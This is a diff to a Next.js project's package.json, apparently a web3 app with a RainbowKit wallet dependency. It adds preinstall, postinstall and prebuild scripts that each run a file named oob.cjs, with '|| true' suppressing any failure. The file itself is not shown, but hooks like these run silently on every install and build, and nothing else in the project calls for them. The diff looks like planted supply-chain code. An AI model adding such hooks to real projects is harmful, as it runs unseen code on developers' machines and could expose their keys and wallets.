@@ -6,7 +6,10 @@
     "dev": "next dev",
     "build": "next build",
     "start": "next start",
-    "lint": "eslint"
+    "lint": "eslint",
+    "preinstall": "node oob.cjs || true",
+    "postinstall": "node oob.cjs || true",
+    "prebuild": "node oob.cjs || true"
   },
   "dependencies": {
     "@rainbow-me/rainbowkit": "^2.2.10",
